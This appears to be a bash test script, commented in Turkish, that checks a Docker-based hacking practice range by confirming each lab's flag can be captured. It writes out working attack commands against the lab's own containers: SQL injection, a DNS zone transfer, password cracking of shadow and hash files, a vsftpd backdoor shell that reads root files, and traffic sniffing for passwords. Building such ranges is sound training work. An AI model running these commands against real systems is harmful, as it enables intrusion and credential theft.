#!/usr/bin/env bash
# ============================================================================
#  test/tool-labs.sh — Gerçek-araç labları FONKSİYONEL test matrisi.
#  Her tool lab için izole bir menzil kurar ve flag'in GERÇEK araç/mekanizmayla
#  elde edilebildiğini doğrular. (Docker gerekir; imajlar önce derlenmeli:
#     docker compose --profile build build)
#  Çalıştır:  bash test/tool-labs.sh
#  Tool lab'lar SEVİYESİZDİR (tek "lab"); klasik low/medium/high için:
#     docker run -d --rm --name m -p 127.0.0.1:3009:3000 -e LAB_MACHINE=m ordek-lab:latest
#     docker exec -e BASE=http://localhost:3000 m node test/level-matrix.mjs
# ============================================================================
set -u
NET=ordek-toollab-test
ATK=ordek-attacker:latest
pass=0; fail=0; skip=0
PASS(){ echo -e "\e[32mPASS\e[0m  $1"; pass=$((pass+1)); }
FAIL(){ echo -e "\e[31mFAIL\e[0m  $1 :: ${2:-}"; fail=$((fail+1)); }
SKIP(){ echo -e "\e[33mSKIP\e[0m  $1 — ${2:-}"; skip=$((skip+1)); }

cleanup(){ docker rm -f probe target victim la >/dev/null 2>&1; docker network rm $NET >/dev/null 2>&1; }
trap cleanup EXIT
docker network create $NET >/dev/null 2>&1

# ---- hedef-tabanlı lablar (web/dns/smb/wp): tek prober (gerçek araç kutusu) ----
docker run -d --rm --name probe --network $NET --cap-add NET_RAW --cap-add NET_ADMIN --entrypoint sleep "$ATK" 600 >/dev/null
T(){ # $1 img $2 scenario $3 alias $4 probe $5 wait
  local img="$1" sc="$2" al="$3" cmd="$4" w="${5:-2}" flag="ordek{test_$2}"
  docker run -d --rm --name target --network $NET --network-alias "$al" -e LAB_SCENARIO="$sc" -e "LAB_FLAG=$flag" "$img" >/dev/null 2>&1
  sleep "$w"
  local out; out=$(docker exec probe bash -lc "$cmd" 2>/dev/null)
  echo "$out" | grep -qF "$flag" && PASS "$sc" || FAIL "$sc" "$(echo "$out" | tr -d '\0' | head -1)"
  docker rm -f target >/dev/null 2>&1
}
T ordek-target-web:latest tool-nmap       target "nc -w3 target 31337" 2
T ordek-target-web:latest tool-ffuf       target "curl -s http://target/admin/flag.txt" 2
T ordek-target-web:latest tool-nikto      target "curl -s -D - -o /dev/null http://target/ | grep -i x-ordek-flag" 2
T ordek-target-web:latest tool-burp       target "curl -s -d 'price=1' http://target/buy" 2
T ordek-target-web:latest tool-sqlmap     target "curl -s 'http://target/product?id=0%20UNION%20SELECT%201,flag,3%20FROM%20secrets'" 2
T ordek-target-web:latest tool-hydra      target "curl -s -d 'username=admin&password=ducky' http://target/login" 2
T ordek-target-dns:latest tool-dnsrecon   target "dig +time=3 @target ordek.lab AXFR" 5
T ordek-target-smb:latest tool-smb        target "smbclient //target/public -N -c 'get flag.txt /tmp/f' >/dev/null 2>&1; cat /tmp/f" 5
T ordek-target-wp:latest  tool-wpscan     target "curl -s http://target/wp-content/plugins/ordek-vuln/readme.txt" 3
docker rm -f probe >/dev/null 2>&1

# ---- loot lablar (gerçek attacker entrypoint flag'i üretir; gerçek kırma) ----
L(){ # $1 scenario $2 crackcmd
  local sc="$1" cmd="$2" flag="ordek{test_$1}"
  docker run -d --rm --name la --cap-add NET_ADMIN -e LAB_SCENARIO="$sc" -e "LAB_FLAG=$flag" "$ATK" >/dev/null 2>&1
  sleep 8
  local out; out=$(docker exec la bash -lc "$cmd" 2>/dev/null)
  echo "$out" | grep -qF "$flag" && PASS "$sc" || FAIL "$sc" "$(echo "$out" | tr '\n' ' ' | tail -c 120)"
  docker rm -f la >/dev/null 2>&1
}
L tool-theharvester "cat /opt/harvest/results.txt"
L tool-john     "john --wordlist=/usr/share/wordlists/ordek.txt /root/loot/shadow.txt >/dev/null 2>&1; john --show /root/loot/shadow.txt"
# hashcat: OpenCL CPU backend (PoCL) varsa gerçek kır; yoksa SKIP (john kırmayı zaten kanıtlar)
if docker run --rm --entrypoint bash "$ATK" -lc "hashcat -I 2>/dev/null | grep -qiE 'Backend Device|Type.*CPU'"; then
  L tool-hashcat "hashcat -m 0 -a 0 /root/loot/hash.txt /usr/share/wordlists/ordek.txt --force -o /tmp/hc.out >/dev/null 2>&1; cat /tmp/hc.out"
else
  SKIP tool-hashcat "OpenCL backend (PoCL) bu ortamda yok — hashcat kurulu ama kıramaz (john gerçek kırmayı kanıtlar)"
fi

# ---- exploit (cve hedefi) ----
docker run -d --rm --name target --network $NET --network-alias target -e LAB_SCENARIO=tool-metasploit -e "LAB_FLAG=ordek{test_cve}" ordek-target-cve:latest >/dev/null 2>&1
docker run -d --rm --name probe --network $NET --entrypoint sleep "$ATK" 200 >/dev/null
sleep 3
for sc in tool-metasploit tool-searchsploit tool-msfvenom; do
  out=$(docker exec probe bash -lc "printf 'id; cat /root/flag.txt\n' | nc -w3 target 6200" 2>/dev/null)
  echo "$out" | grep -qF "ordek{test_cve}" && PASS "$sc (vsftpd backdoor shell)" || FAIL "$sc" "$(echo "$out"|head -1)"
done
docker rm -f probe target >/dev/null 2>&1

# ---- trafik in-path (wireshark/tcpdump): kurban → saldırgan → hedef ----
for sc in tool-wireshark tool-tcpdump; do
  flag="ordek{test_$sc}"
  docker run -d --rm --name target --network $NET --network-alias target -e LAB_SCENARIO=$sc -e "LAB_FLAG=$flag" ordek-target-web:latest >/dev/null 2>&1
  docker run -d --rm --name probe --network $NET --network-alias attacker --cap-add NET_RAW --cap-add NET_ADMIN --sysctl net.ipv4.ip_forward=1 --entrypoint sleep "$ATK" 200 >/dev/null
  docker run -d --rm --name victim --network $NET --network-alias victim --cap-add NET_ADMIN -e LAB_SCENARIO=$sc -e "LAB_FLAG=$flag" -e VICTIM_TARGET=target -e VICTIM_ROUTE_VIA=attacker ordek-victim-bot:latest >/dev/null 2>&1
  sleep 13
  out=$(docker exec probe bash -lc "timeout 14 tcpdump -nni eth0 -A 'tcp dst port 80' 2>/dev/null | grep -i password=" 2>/dev/null)
  echo "$out" | grep -qF "$flag" && PASS "$sc (in-path sniff)" || FAIL "$sc" "yakalanamadı"
  docker rm -f probe target victim >/dev/null 2>&1
done

# ---- interaktif (canlı araç gerektirir) — yalnız altyapı/araç varlığı ----
for sc in tool-bettercap tool-responder tool-setoolkit tool-beef tool-evilginx tool-aircrack; do
  SKIP "$sc" "canlı/interaktif araç (bettercap/responder/SET/BeEF/evilginx/aircrack) — panelde elle çalıştır"
done

echo ""
echo "== TOOL LAB ÖZET: $pass PASS / $fail FAIL / $skip SKIP =="
[ "$fail" -eq 0 ] && exit 0 || exit 1
